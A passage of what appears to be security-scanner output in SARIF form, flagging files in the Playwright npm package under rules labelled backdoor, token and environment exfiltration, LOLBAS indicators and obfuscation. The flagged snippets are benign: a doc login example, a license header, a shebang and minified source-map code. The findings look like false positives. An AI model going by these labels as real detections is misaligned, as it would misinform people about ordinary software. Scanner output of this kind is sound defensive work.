                    "text": "   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(this.page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   }\n",
                    "rendered": {
                      "text": "   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(this.page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   }\n",
                      "markdown": "`   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(this.page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   }\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 4607,
                  "startColumn": 46,
                  "endLine": 4607,
                  "endColumn": 54,
                  "snippet": {
                    "text": "   *\n   *   @step\n   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n",
                    "rendered": {
                      "text": "   *\n   *   @step\n   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n",
                      "markdown": "`   *\n   *   @step\n   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 6561,
                  "startColumn": 42,
                  "endLine": 6561,
                  "endColumn": 64,
                  "snippet": {
                    "text": "// --- ENDGLOBAL ---\n\n/**\n * These tests are executed in Playwright environment that launches the browser\n * and provides a fresh page to each test.\n */\nexport const test: TestType<PlaywrightTestArgs & PlaywrightTestOptions, PlaywrightWorkerArgs & PlaywrightWorkerOptions>;\n",
                    "rendered": {
                      "text": "// --- ENDGLOBAL ---\n\n/**\n * These tests are executed in Playwright environment that launches the browser\n * and provides a fresh page to each test.\n */\nexport const test: TestType<PlaywrightTestArgs & PlaywrightTestOptions, PlaywrightWorkerArgs & PlaywrightWorkerOptions>;\n",
                      "markdown": "`// --- ENDGLOBAL ---\n\n/**\n * These tests are executed in Playwright environment that launches the browser\n * and provides a fresh page to each test.\n */\nexport const test: TestType<PlaywrightTestArgs & PlaywrightTestOptions, PlaywrightWorkerArgs & PlaywrightWorkerOptions>;\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/jsx-runtime.mjs"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 39,
                  "endLine": 7,
                  "snippet": {
                    "text": " *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": " *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "` *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/cli.js"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env node\n/**\n * Copyright (c) Microsoft Corporation.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n",
                    "rendered": {
                      "text": "#!/usr/bin/env node\n/**\n * Copyright (c) Microsoft Corporation.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n",
                      "markdown": "`#!/usr/bin/env node\n/**\n * Copyright (c) Microsoft Corporation.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1980,
                  "startColumn": 8115,
                  "endLine": 1980,
                  "endColumn": 8121,
                  "snippet": {
                    "text": "\"module\"};function Tve(e){return e&&/\\s*(text|application)\\/javascript\\s*(;\\s*charset=utf-?8\\s*)?/i.test(e)?\"module\":e===\"application/json\"?\"json\":null}var G_={__proto__:null,\"data:\":Sve,\"file:\":Pve,\"http:\":H_,\"https:\":H_,\"node:\"(){return\"builtin\"}};function Sve(e){let{1:t}=/^([^/]+\\/[^;,]+)[^,]*?(;base64)?,/.exec(e.pathname)||[null,null,null];return Tve(t)}function xve(e){let t=e.pathname,r=t.length;for(;r--;){let n=t.codePointAt(r);if(n===47)return\"\";if(n===46)return t.codePointAt(r-1)===47?\"\":t.slice(r)}return\"\"}function Pve(e,t,r){let n=xve(e);if(n===\".js\"){let a=K_(e);return a!==\"none\"?a:\"commo",
                    "rendered": {
                      "text": "\"module\"};function Tve(e){return e&&/\\s*(text|application)\\/javascript\\s*(;\\s*charset=utf-?8\\s*)?/i.test(e)?\"module\":e===\"application/json\"?\"json\":null}var G_={__proto__:null,\"data:\":Sve,\"file:\":Pve,\"http:\":H_,\"https:\":H_,\"node:\"(){return\"builtin\"}};function Sve(e){let{1:t}=/^([^/]+\\/[^;,]+)[^,]*?(;base64)?,/.exec(e.pathname)||[null,null,null];return Tve(t)}function xve(e){let t=e.pathname,r=t.length;for(;r--;){let n=t.codePointAt(r);if(n===47)return\"\";if(n===46)return t.codePointAt(r-1)===47?\"\":t.slice(r)}return\"\"}function Pve(e,t,r){let n=xve(e);if(n===\".js\"){let a=K_(e);return a!==\"none\"?a:\"commo",
                      "markdown": "`\"module\"};function Tve(e){return e&&/\\s*(text|application)\\/javascript\\s*(;\\s*charset=utf-?8\\s*)?/i.test(e)?\"module\":e===\"application/json\"?\"json\":null}var G_={__proto__:null,\"data:\":Sve,\"file:\":Pve,\"http:\":H_,\"https:\":H_,\"node:\"(){return\"builtin\"}};function Sve(e){let{1:t}=/^([^/]+\\/[^;,]+)[^,]*?(;base64)?,/.exec(e.pathname)||[null,null,null];return Tve(t)}function xve(e){let t=e.pathname,r=t.length;for(;r--;){let n=t.codePointAt(r);if(n===47)return\"\";if(n===46)return t.codePointAt(r-1)===47?\"\":t.slice(r)}return\"\"}function Pve(e,t,r){let n=xve(e);if(n===\".js\"){let a=K_(e);return a!==\"none\"?a:\"commo`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1767,
                  "startColumn": 1108,
                  "endLine": 1767,
                  "endColumn": 1114,
                  "snippet": {
                    "text": "e},e}function iO(){let e=De();return iO=function(){return e},e}function qf(){let e=qb();return qf=function(){return e},e}var ige=_c(),age=Wb(),oge=eO(),{file:lge,traverseFast:uge}=iO(),Hb=sO()(\"babel:transform:file\"),cge=/^[@#]\\s+sourceMappingURL=data:(?:application|text)\\/json;(?:charset[:=]\\S+?;)?base64,(?:.*)$/,tO=/^[@#][ \\t]+sourceMappingURL=([^\\s'\"`]+)[ \\t]*$/;function*fge(e,t,r,n){if(r=`${r||\"\"}`,n){if(n.type===\"Program\")n=lge(n,[],[]);else if(n.type!==\"File\")throw new Error(\"AST root must be a Program or File node\");t.cloneInputAst&&(n=(0,oge.default)(n))}else n=yield*(0,age.default)(e,t,r);l",
                    "rendered": {
                      "text": "e},e}function iO(){let e=De();return iO=function(){return e},e}function qf(){let e=qb();return qf=function(){return e},e}var ige=_c(),age=Wb(),oge=eO(),{file:lge,traverseFast:uge}=iO(),Hb=sO()(\"babel:transform:file\"),cge=/^[@#]\\s+sourceMappingURL=data:(?:application|text)\\/json;(?:charset[:=]\\S+?;)?base64,(?:.*)$/,tO=/^[@#][ \\t]+sourceMappingURL=([^\\s'\"`]+)[ \\t]*$/;function*fge(e,t,r,n){if(r=`${r||\"\"}`,n){if(n.type===\"Program\")n=lge(n,[],[]);else if(n.type!==\"File\")throw new Error(\"AST root must be a Program or File node\");t.cloneInputAst&&(n=(0,oge.default)(n))}else n=yield*(0,age.default)(e,t,r);l",
                      "markdown": "`e},e}function iO(){let e=De();return iO=function(){return e},e}function qf(){let e=qb();return qf=function(){return e},e}var ige=_c(),age=Wb(),oge=eO(),{file:lge,traverseFast:uge}=iO(),Hb=sO()(\"babel:transform:file\"),cge=/^[@#]\\s+sourceMappingURL=data:(?:application|text)\\/json;(?:charset[:=]\\S+?;)?base64,(?:.*)$/,tO=/^[@#][ \\t]+sourceMappingURL=([^\\s'\"`]+)[ \\t]*$/;function*fge(e,t,r,n){if(r=`${r||\"\"}`,n){if(n.type===\"Program\")n=lge(n,[],[]);else if(n.type!==\"File\")throw new Error(\"AST root must be a Program or File node\");t.cloneInputAst&&(n=(0,oge.default)(n))}else n=yield*(0,age.default)(e,t,r);l`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1751,
                  "startColumn": 1683,
                  "endLine": 1751,
                  "endColumn": 1689,
                  "snippet": {
                    "text": "n this.sourcemap[e]=t,this};ir.prototype.getProperty=function(e){return this.sourcemap[e]};Lt.fromObject=function(e){return new ir(e)};Lt.fromJSON=function(e){return new ir(e,{isJSON:!0})};Lt.fromURI=function(e){return new ir(e,{encoding:\"uri\"})};Lt.fromBase64=function(e){return new ir(e,{encoding:\"base64\"})};Lt.fromComment=function(e){var t,r;return e=e.replace(/^\\/\\*/g,\"//\").replace(/\\*\\/$/g,\"\"),t=Lt.commentRegex.exec(e),r=t&&t[4]||\"uri\",new ir(e,{encoding:r,hasComment:!0})};function XI(e){return new ir(e,{isJSON:!0})}Lt.fromMapFileComment=function(e,t){if(typeof t==\"string\")throw new Error(\"Strin",
                    "rendered": {
                      "text": "n this.sourcemap[e]=t,this};ir.prototype.getProperty=function(e){return this.sourcemap[e]};Lt.fromObject=function(e){return new ir(e)};Lt.fromJSON=function(e){return new ir(e,{isJSON:!0})};Lt.fromURI=function(e){return new ir(e,{encoding:\"uri\"})};Lt.fromBase64=function(e){return new ir(e,{encoding:\"base64\"})};Lt.fromComment=function(e){var t,r;return e=e.replace(/^\\/\\*/g,\"//\").replace(/\\*\\/$/g,\"\"),t=Lt.commentRegex.exec(e),r=t&&t[4]||\"uri\",new ir(e,{encoding:r,hasComment:!0})};function XI(e){return new ir(e,{isJSON:!0})}Lt.fromMapFileComment=function(e,t){if(typeof t==\"string\")throw new Error(\"Strin",
                      "markdown": "`n this.sourcemap[e]=t,this};ir.prototype.getProperty=function(e){return this.sourcemap[e]};Lt.fromObject=function(e){return new ir(e)};Lt.fromJSON=function(e){return new ir(e,{isJSON:!0})};Lt.fromURI=function(e){return new ir(e,{encoding:\"uri\"})};Lt.fromBase64=function(e){return new ir(e,{encoding:\"base64\"})};Lt.fromComment=function(e){var t,r;return e=e.replace(/^\\/\\*/g,\"//\").replace(/\\*\\/$/g,\"\"),t=Lt.commentRegex.exec(e),r=t&&t[4]||\"uri\",new ir(e,{encoding:r,hasComment:!0})};function XI(e){return new ir(e,{isJSON:!0})}Lt.fromMapFileComment=function(e,t){if(typeof t==\"string\")throw new Error(\"Strin`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1751,
                  "startColumn": 935,
                  "endLine": 1751,
                  "endColumn": 941,
                  "snippet": {
                    "text": "fer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.toJSON();return encodeURIComponent(e)};ir.prototype.toComment=function(e){var t,r,n;return e!=null&&e.encoding===\"uri\"?(t=\"\",r=this.toURI()):(t=\";base64\",r=this.toBase64()),n=\"sourceMappingURL=data:application/json;charset=utf-8\"+t+\",\"+r,e!=null&&e.multiline?\"/*# \"+n+\" */\":\"//# \"+n};ir.prototype.toObject=function(){return JSON.parse(this.toJSON())};ir.prototype.addProperty=function(e,t){if(this.sourcemap.hasOwnProperty(e))throw new Error('property ",
                    "rendered": {
                      "text": "fer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.toJSON();return encodeURIComponent(e)};ir.prototype.toComment=function(e){var t,r,n;return e!=null&&e.encoding===\"uri\"?(t=\"\",r=this.toURI()):(t=\";base64\",r=this.toBase64()),n=\"sourceMappingURL=data:application/json;charset=utf-8\"+t+\",\"+r,e!=null&&e.multiline?\"/*# \"+n+\" */\":\"//# \"+n};ir.prototype.toObject=function(){return JSON.parse(this.toJSON())};ir.prototype.addProperty=function(e,t){if(this.sourcemap.hasOwnProperty(e))throw new Error('property ",
                      "markdown": "`fer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.toJSON();return encodeURIComponent(e)};ir.prototype.toComment=function(e){var t,r,n;return e!=null&&e.encoding===\"uri\"?(t=\"\",r=this.toURI()):(t=\";base64\",r=this.toBase64()),n=\"sourceMappingURL=data:application/json;charset=utf-8\"+t+\",\"+r,e!=null&&e.multiline?\"/*# \"+n+\" */\":\"//# \"+n};ir.prototype.toObject=function(){return JSON.parse(this.toJSON())};ir.prototype.addProperty=function(e,t){if(this.sourcemap.hasOwnProperty(e))throw new Error('property `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1751,
                  "startColumn": 659,
                  "endLine": 1751,
                  "endColumn": 665,
                  "snippet": {
                    "text": "ir.prototype.toBase64=Z0e:ir.prototype.toBase64=ege;function Q0e(){var e=this.toJSON();return Buffer.from(e,\"utf8\").toString(\"base64\")}function Z0e(){var e=this.toJSON();if(typeof e==\"number\")throw new TypeError(\"The json to encode must not be of type number.\");return new Buffer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.toJSON();return encodeURIComponent(e)};ir.prototype.toComment=function(e){var t,r,n;return e!=null&&e.encoding===\"uri\"?(t=\"\",r=this.toURI()):(t=\";base64\",r=this.toBase64()),n=\"",
                    "rendered": {
                      "text": "ir.prototype.toBase64=Z0e:ir.prototype.toBase64=ege;function Q0e(){var e=this.toJSON();return Buffer.from(e,\"utf8\").toString(\"base64\")}function Z0e(){var e=this.toJSON();if(typeof e==\"number\")throw new TypeError(\"The json to encode must not be of type number.\");return new Buffer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.toJSON();return encodeURIComponent(e)};ir.prototype.toComment=function(e){var t,r,n;return e!=null&&e.encoding===\"uri\"?(t=\"\",r=this.toURI()):(t=\";base64\",r=this.toBase64()),n=\"",
                      "markdown": "`ir.prototype.toBase64=Z0e:ir.prototype.toBase64=ege;function Q0e(){var e=this.toJSON();return Buffer.from(e,\"utf8\").toString(\"base64\")}function Z0e(){var e=this.toJSON();if(typeof e==\"number\")throw new TypeError(\"The json to encode must not be of type number.\");return new Buffer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.toJSON();return encodeURIComponent(e)};ir.prototype.toComment=function(e){var t,r,n;return e!=null&&e.encoding===\"uri\"?(t=\"\",r=this.toURI()):(t=\";base64\",r=this.toBase64()),n=\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1751,
                  "startColumn": 485,
                  "endLine": 1751,
                  "endColumn": 491,
                  "snippet": {
                    "text": "sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?ir.prototype.toBase64=Q0e:ir.prototype.toBase64=Z0e:ir.prototype.toBase64=ege;function Q0e(){var e=this.toJSON();return Buffer.from(e,\"utf8\").toString(\"base64\")}function Z0e(){var e=this.toJSON();if(typeof e==\"number\")throw new TypeError(\"The json to encode must not be of type number.\");return new Buffer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.to",
                    "rendered": {
                      "text": "sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?ir.prototype.toBase64=Q0e:ir.prototype.toBase64=Z0e:ir.prototype.toBase64=ege;function Q0e(){var e=this.toJSON();return Buffer.from(e,\"utf8\").toString(\"base64\")}function Z0e(){var e=this.toJSON();if(typeof e==\"number\")throw new TypeError(\"The json to encode must not be of type number.\");return new Buffer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.to",
                      "markdown": "`sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?ir.prototype.toBase64=Q0e:ir.prototype.toBase64=Z0e:ir.prototype.toBase64=ege;function Q0e(){var e=this.toJSON();return Buffer.from(e,\"utf8\").toString(\"base64\")}function Z0e(){var e=this.toJSON();if(typeof e==\"number\")throw new TypeError(\"The json to encode must not be of type number.\");return new Buffer(e,\"utf8\").toString(\"base64\")}function ege(){var e=this.toJSON();return btoa(unescape(encodeURIComponent(e)))}ir.prototype.toURI=function(){var e=this.to`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1751,
                  "startColumn": 76,
                  "endLine": 1751,
                  "endColumn": 82,
                  "snippet": {
                    "text": " r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the map file at \"+n+`\n`+i.stack)}}function ir(e,t){t=t||{},t.hasComment&&(e=J0e(e)),t.encoding===\"base64\"?e=Rf(e):t.encoding===\"uri\"&&(e=decodeURIComponent(e)),(t.isJSON||t.encoding)&&(e=JSON.parse(e)),this.sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?ir.prototype.toBase64=Q0e:ir.prototype.toBase64=Z",
                    "rendered": {
                      "text": " r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the map file at \"+n+`\n`+i.stack)}}function ir(e,t){t=t||{},t.hasComment&&(e=J0e(e)),t.encoding===\"base64\"?e=Rf(e):t.encoding===\"uri\"&&(e=decodeURIComponent(e)),(t.isJSON||t.encoding)&&(e=JSON.parse(e)),this.sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?ir.prototype.toBase64=Q0e:ir.prototype.toBase64=Z",
                      "markdown": "` r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the map file at \"+n+`\n`+i.stack)}}function ir(e,t){t=t||{},t.hasComment&&(e=J0e(e)),t.encoding===\"base64\"?e=Rf(e):t.encoding===\"uri\"&&(e=decodeURIComponent(e)),(t.isJSON||t.encoding)&&(e=JSON.parse(e)),this.sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?ir.prototype.toBase64=Q0e:ir.prototype.toBase64=Z`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1750,
                  "startColumn": 5421,
                  "endLine": 1750,
                  "endColumn": 5427,
                  "snippet": {
                    "text": "\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"A",
                    "rendered": {
                      "text": "\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"A",
                      "markdown": "`\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"A`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1750,
                  "startColumn": 5267,
                  "endLine": 1750,
                  "endColumn": 5273,
                  "snippet": {
                    "text": "apFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapF",
                    "rendered": {
                      "text": "apFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapF",
